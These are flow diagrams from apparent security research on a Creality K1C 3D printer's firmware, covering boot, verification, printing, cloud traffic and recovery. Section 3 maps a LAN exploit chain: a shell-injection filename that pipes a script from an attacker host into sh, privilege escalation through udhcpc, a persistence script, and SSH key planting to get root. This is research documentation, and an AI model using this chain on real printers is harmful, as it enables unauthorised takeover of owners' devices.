# Creality K1C 2025: Flow Diagrams

## 1. Boot Flow (POWER to READY)

```mermaid
flowchart TD
    A([POWER ON]) --> B["U-Boot SPL<br/>eMMC offset 0x4600<br/>encrypted"]
    B --> C["U-Boot 2013.07<br/>encrypted<br/>loads kernel from mmcblk0p5"]
    C --> D["Linux 5.10.186<br/>MIPS32 LE<br/>initramfs to RAM"]
    D --> E["/linuxrc<br/>busybox init<br/>reads /etc/inittab"]
    E --> F["/etc/init.d/rcS"]
    F --> G["S10mdev<br/>device manager"]
    G --> H["S20urandom<br/>RNG seed"]
    H --> I[S30dbus]
    I --> J["S40network<br/>lo interface"]
    J --> K["S50dropbear<br/>SSH on port 22"]
    K --> L[". /bin/seed.sh<br/>sourced in rcS shell"]
    L --> M["seed.sh<br/>see seed.sh flow"]
    M --> N["run_system_service<br/>S??* as root"]
    N --> O["run_creality_service<br/>CS??* as creality"]
    O --> P([SYSTEM READY])

    style A fill:#2d2d2d,color:#fff
    style P fill:#1a5c1a,color:#fff
    style K fill:#1a3a5c,color:#fff
    style L fill:#5c3a1a,color:#fff
```

---

## 2. seed.sh Execution

```mermaid
flowchart TD
    A([seed.sh start]) --> B["insmod soc_security.ko<br/>registers /dev/sc"]
    B --> C["wait_system<br/>poll for /dev/mmcblk0"]
    C --> D["mount_do_userdata<br/>fsck + mount mmcblk0p10<br/>to /usr/data"]
    D --> E{upg_do<br/>upgrade pending?}
    E -->|state file exists| F["cmd_sc -v upgfile<br/>verify OTA package"]
    F --> G["upgbox -U -f upgfile<br/>flash partitions"]
    G --> H([reboot])
    E -->|no upgrade| I["do_reset_clean<br/>process clean_list if present"]
    I --> J["decrypt_sn_mac<br/>cmd_sc mmcblk0p2<br/>to /tmp/params"]
    J --> K["mount_do_deplibs<br/>cmd_sc -v mmcblk0p7<br/>eFuse + RSA + AES verify"]
    K -->|FAIL| L([halt - BRICK POINT])
    K -->|PASS| M["losetup + mount squashfs<br/>to /usr/deplibs"]
    M --> N["mount_do_apps<br/>mount mmcblk0p8 ext4<br/>to /usr/apps"]
    N --> O["verify_apps<br/>cmd_sc decrypt each .bin<br/>to /tmp/apps/<br/>alchemistp nexusp onyxp<br/>quintusp thirteenthp<br/>solusp vectorp mdns"]
    O -->|any FAIL| L
    O -->|all PASS| P["check_login_permission<br/>/usr/data/permission exists?<br/>cmd_sc -v verify<br/>MAC match: unlock shadow"]
    P --> Q["chattr +i /tmp/shadow<br/>locks shadow immutable"]
    Q --> R["init_sys_date<br/>read /usr/apps/etc/buildtime"]
    R --> S["run_system_service<br/>/etc/appetc/init.d/S??*<br/>as root"]
    S --> T["run_creality_service<br/>/etc/appetc/init.d/CS??*<br/>as creality user"]
    T --> U([seed.sh complete])

    style A fill:#2d2d2d,color:#fff
    style L fill:#8b0000,color:#fff
    style H fill:#8b0000,color:#fff
    style U fill:#1a5c1a,color:#fff
    style K fill:#5c3a1a,color:#fff
```

---

## 3. WebSocket RCE Exploit Flow

```mermaid
flowchart TD
    A(["Attacker<br/>LAN access"]) --> B["python3 k1c-2025-exploit.py<br/>--host-ip ATTACKER<br/>--printer-ip PRINTER<br/>--public-key id_ecdsa.pub"]
    B --> C["Start HTTP server<br/>port 4444<br/>serving payloads"]
    B --> D["WebSocket connect<br/>ws://PRINTER:9999<br/>subprotocol: wsslicer"]
    D --> E["Send JSON<br/>method: set<br/>params.print: http://ATTACKER/exploit-TIME"]
    E --> F["vectorp<br/>print_proc<br/>service_httpchunk_request"]
    F --> G["Printer fetches<br/>http://ATTACKER/exploit-TIME"]
    G --> H["Server responds<br/>Content-Disposition: filename=<br/>dest';curl http://ATTACKER/bootstrap.sh | sh;#.gcode"]
    H --> I["Shell injection<br/>in filename handling"]
    I --> J["Printer fetches<br/>/bootstrap.sh"]
    J --> K["wget /privesc.py<br/>udhcpc -s /tmp/privesc.py"]
    K --> L["udhcpc runs privesc.py<br/>as ROOT<br/>CAP_NET_ADMIN"]
    L --> M["wget /S999persistence<br/>chmod +x<br/>exec S999persistence"]
    M --> N["mkdir /root/.ssh<br/>chmod 700<br/>echo PUBLIC_KEY<br/>to authorized_keys"]
    N --> O["dropbearkey gen<br/>host keys"]
    O --> P["chattr -i /tmp/shadow<br/>sed unlock root account"]
    P --> Q(["SSH root@PRINTER<br/>authenticated"])

    style A fill:#2d2d2d,color:#fff
    style Q fill:#1a5c1a,color:#fff
    style L fill:#5c1a1a,color:#fff
    style I fill:#5c3a1a,color:#fff
```

---

## 4. Print Flow (Touch to Motion)

```mermaid
flowchart TD
    A(["User touches<br/>screen"]) --> B["vectorp<br/>LVGL UI<br/>/tmp/apps/vectorp"]
    B --> C["Select gcode file<br/>from /usr/data/printer_data/gcodes"]
    C --> D["wsKlipper::sendGcodeFile<br/>via solusp IPC"]
    D --> E["solusp<br/>/tmp/apps/solusp"]
    E --> F["wsKlipper class<br/>Unix socket /tmp/klippy_uds"]
    F --> G["Klipper<br/>python klippy.py<br/>running as creality"]
    G --> H["Parse gcode<br/>sequence planning"]
    H --> I["Serial commands<br/>to MCU"]
    I --> J["MCU<br/>toolhead microcontroller"]
    J --> K["Stepper drivers<br/>X Y Z E motion"]
    J --> L["Hotend heater<br/>temperature control"]
    J --> M["Bed heater<br/>temperature control"]
    J --> N["Part cooling fan<br/>speed control"]
    G --> O["Status updates<br/>via klippy_uds"]
    O --> E
    E --> P["IPC to vectorp<br/>layer count, temps, %"]
    P --> B

    B2["nexusp<br/>port 7125"] --> G
    B3["Fluidd/Mainsail<br/>browser :4408/:4409"] --> B2

    style A fill:#2d2d2d,color:#fff
    style J fill:#1a3a5c,color:#fff
```

---

## 5. Cloud Phone-Home Flow

```mermaid
flowchart TD
    subgraph Printer
        V[vectorp]
        A[alchemistp]
        O[onyxp]
        T[thirteenthp]
        M[mdns]
    end

    subgraph Creality Cloud
        MQTT["mqtt.crealitycloud.cn<br/>mqtt.crealitycloud.com<br/>port 1883 plaintext"]
        API["api.crealitycloud.cn<br/>api.crealitycloud.com<br/>HTTPS"]
        WRT["admin-pre.crealitycloud.cn<br/>WebRTC signaling WSS"]
        OSS["Alibaba OSS<br/>log + timelapse upload"]
        UNK["58.48.202.36<br/>hardcoded IP<br/>UNKNOWN PURPOSE"]
    end

    subgraph LAN
        DEV["Other LAN devices<br/>mDNS discovery"]
    end

    V -->|"publish: cx_machine.system_info<br/>cx_machine.proc_stats"| MQTT
    V -->|"device register<br/>firmware list<br/>owner binding"| API
    V -->|"Alibaba STS credentials<br/>log + timelapse files"| OSS
    A -->|unknown protocol| UNK
    O -->|"WebRTC signaling<br/>JWT auth"| WRT
    T -->|"DTLS/SRTP<br/>media stream"| WRT
    M -->|"UDP broadcast<br/>_Creality-SN._udp.local"| DEV

    style UNK fill:#8b0000,color:#fff
    style MQTT fill:#5c3a1a,color:#fff
    style Printer fill:#1a1a2e,color:#fff
    style Creality Cloud fill:#2d1a1a,color:#fff
```

---

## 6. Recovery Flow (Software Path)

```mermaid
flowchart TD
    A(["mmcblk0p7 corrupted<br/>or verification fails"]) --> B["seed.sh<br/>mount_do_deplibs<br/>cmd_sc -v FAILS"]

    subgraph Current Behavior
        B --> C([halt - no recovery])
    end

    subgraph Patched Behavior
        B --> D["log warning<br/>continue without halt"]
        D --> E["mount attempt<br/>squashfs may still mount<br/>if data intact"]
        E --> F["mount_do_apps<br/>/usr/apps still mounts"]
        F --> G["S999persistence runs<br/>from /usr/apps/etc/init.d/"]
        G --> H["Recovery dropbear starts<br/>from /usr/apps/bin/dropbear"]
        H --> I(["SSH root access<br/>over LAN"])
        I --> J["dd restore from backup<br/>mmcblk0p7 from eMMC image"]
        J --> K[reboot]
        K --> L([Normal boot - recovered])
    end

    subgraph Requirements
        R1["Modified seed.sh<br/>halt removed"]
        R2["Kernel repacked<br/>with new initramfs"]
        R3["Signed with own RSA key<br/>via soc_security.ko bypass"]
        R4[Flashed to mmcblk0p5]
        R5["dropbear copy<br/>in /usr/apps/bin/"]
        R6["eMMC backup<br/>on host machine"]
    end

    style A fill:#8b0000,color:#fff
    style C fill:#8b0000,color:#fff
    style L fill:#1a5c1a,color:#fff
    style I fill:#1a3a5c,color:#fff
```
